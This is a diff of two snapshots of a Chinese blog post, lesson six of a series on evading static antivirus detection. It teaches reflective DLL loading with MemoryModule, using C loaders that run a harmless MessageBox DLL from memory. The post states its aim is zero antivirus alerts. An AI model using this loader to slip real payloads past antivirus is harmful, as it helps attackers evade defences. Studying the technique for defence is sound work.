@@ -1,32 +1,125 @@
-<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>静态恶意代码逃逸（第六课） - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>02</span>
-<span class=rest>Jan 2020</span></div></div><div class=matter><h1 class=title>静态恶意代码逃逸（第六课）</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><a href=#0x01-memorymodule>0x01 MemoryModule</a></li><li><a href=#0x02-反射dll加载的实验>0x02 反射DLL加载的实验</a></li><li><a href=#0x03-反射dll与msf联动>0x03 反射DLL与MSF联动</a><ol><li><a href=#生成dll>生成DLL</a></li></ol></li><li><a href=#0x04-总结>0x04 总结</a></li></ol></nav></aside><p>代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><h2 id=0x01-memorymodule>0x01 MemoryModule</h2><p>先来介绍以下MemoryModule这个项目的来源。</p><p><a href=https://payloads.online/archivers/2019-03-14/1>MemoryModule-实现原理</a></p><p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p><p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p><p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p><p>MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule</p><p>但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule</p><h2 id=0x02-反射dll加载的实验>0x02 反射DLL加载的实验</h2><p>首先体验一下正常DLL加载的过程：</p><p>写一个DLL：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
-</span></span><span style=display:flex><span>VOID <span style=color:#a6e22e>msg</span>(VOID){
-</span></span><span style=display:flex><span>	<span style=color:#a6e22e>MessageBox</span>(NULL,<span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;Test&#34;</span>),<span style=color:#a6e22e>TEXT</span>(<span style=color:#e6db74>&#34;Hello&#34;</span>),MB_OK);
-</span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span>;
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>这里我采用了Def文件来进行导出：</p><p><img src=https://images.payloads.online/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png alt=2020-01-03-13-05-56></p><p><img src=https://images.payloads.online/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png alt=2020-01-03-13-06-15></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;;</span><span style=color:#75715e>
+<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>静态恶意代码逃逸（第六课） - 倾旋的博客</title><meta name=theme-color><meta name=description content='代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+0x01 MemoryModule
+先来介绍以下MemoryModule这个项目的来源。
+MemoryModule-实现原理
+项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。
+爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。
+当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。
+MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule
+但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule
+0x02 反射DLL加载的实验
+首先体验一下正常DLL加载的过程：
+写一个DLL：
+#include <Windows.h>
+
+VOID msg(VOID){
+	MessageBox(NULL,TEXT("Test"),TEXT("Hello"),MB_OK);
+	return;
+}
+这里我采用了Def文件来进行导出：
+
+
+#include <Windows.h>;
+
+typedef VOID (*msg)(VOID);
+
+int main()
+{
+	msg RunMsg;
+	HMODULE  hBadCode = LoadLibrary(TEXT("BadCode-DLL.dll"));
+
+	RunMsg = (msg)GetProcAddress(hBadCode,"msg");
+	RunMsg();
+	FreeLibrary(hBadCode);
+
+	return 0;
+}
+通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？
+接下来贴上MemoryModule的使用方法：
+
+将要加载的PE文件读入内存
+初始化MemoryModule句柄
+装载内存
+获得导出函数地址
+执行导出函数
+释放MemoryModule句柄
+
+这里我将MemoryModule项目代码放入当前项目：
+
+主要是：MemoryModule.h、MemoryModule.cpp
+加载代码
+#include <Windows.h>;
+#include <stdio.h>
+#include "MemoryModule.h"
+
+typedef VOID (*msg)(VOID);
+
+// 打开文件并获取大小
+DWORD OpenBadCodeDLL(HANDLE & hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
+	DWORD dwHighFileSize = 0;
+	DWORD dwLowFileSize = 0;
+	// 打开文件
+	hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
+	if(hBadCodeDll == INVALID_HANDLE_VALUE){
+		return GetLastError();
+	}
+	dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);
+	return dwLowFileSize;
+}
+
+
+int main()
+{
+	msg RunMsg;  // msg函数的函数指针
+	HMEMORYMODULE hModule; // MemoryModule句柄，应该可以这么理解,,
+	HANDLE hBadCodeDll = INVALID_HANDLE_VALUE; // 打开PE文件的句柄
+	WCHAR szBadCodeFile[] = TEXT("C:\\Users\\admin\\Documents\\Visual Studio 2012\\Projects\\BadCode\\Debug\\BadCode-DLL.dll"); // PE文件的物理路径
+	DWORD dwFileSize = 0; // PE文件大小
+	DWORD dwReadOfFileSize = 0; // 已读取的PE文件大小
+	PBYTE bFileBuffer = NULL; // PE文件的内存地址
+	
+	// 打开文件
+	dwFileSize = OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);
+	// 如果打开失败直接退出
+	if(hBadCodeDll == INVALID_HANDLE_VALUE){
+		return GetLastError();
+	}
+	// 申请放置PE文件的内存空间
+	bFileBuffer = new BYTE[dwFileSize];
+	// 读取文件
+	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,&amp;dwReadOfFileSize,NULL);
+	// 如果读取错误直接退出
+	if(dwReadOfFileSize != dwFileSize){
+		return GetLastError();
+	}
+	// 关闭打开PE文件的句柄
+	CloseHandle(hBadCodeDll);
+	// 导入PE文件
+	hModule = MemoryLoadLibrary(bFileBuffer);
+	// 如果加载失败，就退出
+	if(hModule == NULL){
+		delete [] bFileBuffer;
+		return -1;
+	}
+	// 获取msg导出函数地址
+	RunMsg = (msg)MemoryGetProcAddress(hModule,"msg");
+	// 运行msg函数
+	RunMsg();
+	// 释放资源
+	MemoryFreeLibrary(hModule);
+	// 释放PE内存
+	delete [] bFileBuffer;
+
+	return GetLastError();
+}
+运行结果：'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="静态恶意代码逃逸（第六课）"><meta itemprop=description content="本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。"><meta itemprop=datePublished content="2020-01-02T00:00:00+00:00"><meta itemprop=dateModified content="2020-01-02T00:00:00+00:00"><meta itemprop=wordCount content="577"><meta property="og:url" content="https://payloads.online/archivers/2020-01-02/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="静态恶意代码逃逸（第六课）"><meta property="og:description" content="本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-01-02T00:00:00+00:00"><meta property="article:modified_time" content="2020-01-02T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="静态恶意代码逃逸（第六课）"><meta name=twitter:description content="本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。"><link rel=canonical href=https://payloads.online/archivers/2020-01-02/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">静态恶意代码逃逸（第六课）</h1><div class="text-xs antialiased opacity-60"><time>Jan 2, 2020</time><span class=mx-1>&#183;</span>
+<span>倾旋</span></div></header><section><p>代码将会上传至Github，方便读者下载研究 : <a href=https://github.com/Rvn0xsy/BadCode>https://github.com/Rvn0xsy/BadCode</a></p><h2 id=0x01-memorymodule>0x01 MemoryModule</h2><p>先来介绍以下MemoryModule这个项目的来源。</p><p><a href=https://payloads.online/archivers/2019-03-14/1>MemoryModule-实现原理</a></p><p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p><p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p><p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p><p>MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule</p><p>但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule</p><h2 id=0x02-反射dll加载的实验>0x02 反射DLL加载的实验</h2><p>首先体验一下正常DLL加载的过程：</p><p>写一个DLL：</p><pre tabindex=0><code>#include &lt;Windows.h&gt;
+
+VOID msg(VOID){
+	MessageBox(NULL,TEXT(&#34;Test&#34;),TEXT(&#34;Hello&#34;),MB_OK);
+	return;
+}
+</code></pre><p>这里我采用了Def文件来进行导出：</p><p><img src=https://images.payloads.online/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png alt=2020-01-03-13-05-56></p><p><img src=https://images.payloads.online/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png alt=2020-01-03-13-06-15></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;;</span><span style=color:#75715e>
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>
 </span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#a6e22e>VOID</span> (<span style=color:#f92672>*</span>msg)(VOID);
 </span></span><span style=display:flex><span>
@@ -41,71 +134,7 @@
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>	<span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></td></tr></table></div></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p><p>接下来贴上MemoryModule的使用方法：</p><ol><li>将要加载的PE文件读入内存</li><li>初始化MemoryModule句柄</li><li>装载内存</li><li>获得导出函数地址</li><li>执行导出函数</li><li>释放MemoryModule句柄</li></ol><p>这里我将MemoryModule项目代码放入当前项目：</p><p><img src=https://images.payloads.online/824455c4-4f5f-11ec-b777-00d861bf4abb.png alt=2020-01-03-13-06-38></p><p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p><p>加载代码</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">51
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">52
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">53
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">54
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">55
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">56
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">57
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">58
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">59
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">60
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">61
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">62
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">63
-</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">64
-</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;;</span><span style=color:#75715e>
